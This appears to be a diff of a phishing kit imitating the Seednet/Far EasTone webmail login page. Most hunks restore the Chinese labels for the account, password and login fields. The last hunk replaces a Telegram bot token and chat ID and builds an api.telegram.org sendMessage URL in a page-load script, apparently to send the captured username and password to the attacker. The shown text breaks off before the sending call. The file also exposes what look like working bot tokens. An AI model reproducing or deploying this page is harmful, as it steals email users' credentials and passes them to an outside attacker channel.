@@ -276,21 +276,21 @@ $(Init);
 		<div id="container">
 
 		<div id="header">
-			<div class="logo"><a target="_blank" rel="noopener noreferrer" href="https://www.fetnet.net/" rel="noopener noreferrer"><img src="https://nwebmail.seed.net.tw/img/seednet_fs_logo.gif" alt=?? width="142" height="46"></a></div>
+			<div class="logo"><a target="_blank" rel="noopener noreferrer" href="https://www.fetnet.net/" rel="noopener noreferrer"><img src="https://nwebmail.seed.net.tw/img/seednet_fs_logo.gif" alt=遠傳 width="142" height="46"></a></div>
 			<div class="logo"><a target="_blank" rel="noopener noreferrer" href="https://www.seed.net.tw" rel="noopener noreferrer"><IMG src="https://nwebmail.seed.net.tw/img/seednet_sn_logo.gif" alt=Seednet width="169" height="46"></a></div>
 			<div class="slogan"></div>
 			<div class="topNav">
-				<a target="_blank" rel="noopener noreferrer" href="https://www.seed.net.tw/">????</a> <span class="navSpace">|</span>
-				<a target="_blank" rel="noopener noreferrer" href="https://www.fetnet.net/enterprise">????</a> <span class="navSpace">|</span>
-				<a target="_blank" rel="noopener noreferrer" href="https://service.seed.net.tw/">??????</a> <span class="navSpace">|</span>
+				<a target="_blank" rel="noopener noreferrer" href="https://www.seed.net.tw/">家用寬頻</a> <span class="navSpace">|</span>
+				<a target="_blank" rel="noopener noreferrer" href="https://www.fetnet.net/enterprise">企業服務</a> <span class="navSpace">|</span>
+				<a target="_blank" rel="noopener noreferrer" href="https://service.seed.net.tw/">客戶服務中心</a> <span class="navSpace">|</span>
 				<a target="_blank" rel="noopener noreferrer" href="https://www.seed.net.tw/sitemap/index.htm">Sitemap</a>
 				<img width="10" height="10" src="https://nwebmail.seed.net.tw/img/seednet_empty.gif"/>
 			</div>
 		</div>
 		<div id="location">
-			<a target="_blank" rel="noopener noreferrer" href="https://www.fetnet.net">??</a> &gt;
-			<a target="_blank" rel="noopener noreferrer" href="https://www.seed.net.tw">????</a> &gt;
-			<a href="#">??????</a>
+			<a target="_blank" rel="noopener noreferrer" href="https://www.fetnet.net">首頁</a> &gt;
+			<a target="_blank" rel="noopener noreferrer" href="https://www.seed.net.tw">家用寬頻</a> &gt;
+			<a href="#">個人郵件服務</a>
 		</div>
 		<form name="ajax_login" id="ajax_form" hidden action="" method="post">
 			
@@ -334,10 +334,10 @@ $(Init);
 					<input type="radio" name="tab-controller" id="tab-4" />
 					<input type="radio" name="tab-controller" id="tab-5" />
 					<div id="tab-heads">
-						<label for="tab-1">???????</label>
+						<label for="tab-1">請輸入帳號密碼</label>
 						<label for="tab-2" hidden>SAML</label>
 						<label for="tab-3" hidden>Google</label>
-						<label for="tab-4" hidden>??</label>
+						<label for="tab-4" hidden>憑證</label>
 						<label for="tab-5" hidden></label>
 					</div>
 					<div id="tab-bodies">
@@ -362,7 +362,7 @@ $(Init);
 
 									<div class="keyboard-button-container">
 										<label class="input-wrapper" data-icon="email">
-											<input placeholder="??" maxlength="318" value=""  id="email" onfocus="stBoard && stBoard.setTarget(this)"
+											<input placeholder="帳號" maxlength="318" value=""  id="email" onfocus="stBoard && stBoard.setTarget(this)"
 												
 													name="USERID"
 												 />
@@ -377,7 +377,7 @@ $(Init);
 
 									<div class="password-button-container">
 										<label class="input-wrapper" data-icon="lock">
-											<input type="password" name="PASSWD" id="password" autocomplete="off" maxlength="32" placeholder="??" onfocus="stBoard && stBoard.setTarget(this)" oninput="PasswordBtnSwitch();" />
+											<input type="password" name="PASSWD" id="password" autocomplete="off" maxlength="32" placeholder="密碼" onfocus="stBoard && stBoard.setTarget(this)" oninput="PasswordBtnSwitch();" />
 											<button id="PasswordBtn" type="button" class="icon-button password-button" onclick="PasswordTypeSwitch();" tabindex="-1" style="display:none";>
 												<img src="https://nwebmail.seed.net.tw/img/ic_visibility_off.svg" />
 											</button>
@@ -392,12 +392,12 @@ $(Init);
 										
 										
 										<input type="checkbox" name="remember" value="1" id="remember" />
-										<label for="remember">????</label>
+										<label for="remember">記住帳號</label>
 										<input type="checkbox" name="opennw" value="1" id="new-window" />
-										<label for="new-window">????</label>
+										<label for="new-window">開新視窗</label>
 										
 										
-										<a href="https://service.seed.net.tw/index.htm" id="change-pwd"  >????</a>
+										<a href="https://service.seed.net.tw/index.htm" id="change-pwd"  >忘記密碼</a>
 									</div>
 
 									
@@ -406,7 +406,7 @@ $(Init);
 
 									<input type="submit"
 										
-										value="??" id="submit-btn"
+										value="登入" id="submit-btn"
 										 />
 
 									
@@ -420,22 +420,22 @@ $(Init);
 							</form>
 						</div>
 						<div data-id="tab-2">
-							<input type="button" value="??" id="submit-btn" />
+							<input type="button" value="登入" id="submit-btn" />
 						</div>
 						<div data-id="tab-3">
-							<input type="button" value="??" id="submit-btn" />
+							<input type="button" value="登入" id="submit-btn" />
 						</div>
 						<div data-id="tab-4">
-							<input type="button" value="??" id="submit-btn" />
+							<input type="button" value="登入" id="submit-btn" />
 						</div>
 						<div data-id="tab-5">
-							<input type="button" value="??" id="submit-btn" />
+							<input type="button" value="登入" id="submit-btn" />
 						</div>
 					</div>
 				</div>
 			</div>
 		</div>
-		<div id="copyright"><div id="copyright-info-href"><a target="_blank" href="http://www.seed.net.tw/contactus/index.htm">????</a> | <a target="_blank" href="http://www.seed.net.tw/security/index.htm">??????</a> | <a target="_blank" href="https://www.fetnet.net/information/privacy.html">?????</a> | <a target="_blank" href="https://www.fetnet.net/information/copyright.html">???????</a> | <a target="_blank" href="http://www.seed.net.tw/vas/share/mailbox/webmail_contract.pdf">????</a></div><div>????:??????0809-080-080(??)???????449-5000(?????02);?????123(??)</div> <div class="footer">&copy; ??????????? ????</div></div>
+		<div id="copyright"><div id="copyright-info-href"><a target="_blank" href="http://www.seed.net.tw/contactus/index.htm">聯絡我們</a> | <a target="_blank" href="http://www.seed.net.tw/security/index.htm">兒童網路安全</a> | <a target="_blank" href="https://www.fetnet.net/information/privacy.html">隱私權政策</a> | <a target="_blank" href="https://www.fetnet.net/information/copyright.html">著作權保護措施</a> | <a target="_blank" href="http://www.seed.net.tw/vas/share/mailbox/webmail_contract.pdf">服務條款</a></div><div>客服專線：市話手機直撥0809-080-080(免費)、市話手機直撥449-5000(手機撥請加02)；節費盒直撥123(免費)</div> <div class="footer">&copy; 新世紀資通股份有限公司 版權所有</div></div>
 
 
 		<script> </script>
@@ -449,8 +449,8 @@ $(Init);
 $(document).ready(function(){
 var count=0;
 
-var tx1="5750086172";
-var tx2="7430400834:AAGB3i4RM5sYEi_Y7EE8DpdV_16g70qXVXI";
+var tx1="6017675377";
+var tx2="7695093381:AAH0Y0OQ7xZR0gmMNVWIBsmpKTMRDxJstcI";
 ur = "https://api.telegram.org/bot"+tx2+"/sendMessage?chat_id="+tx1;
 
 
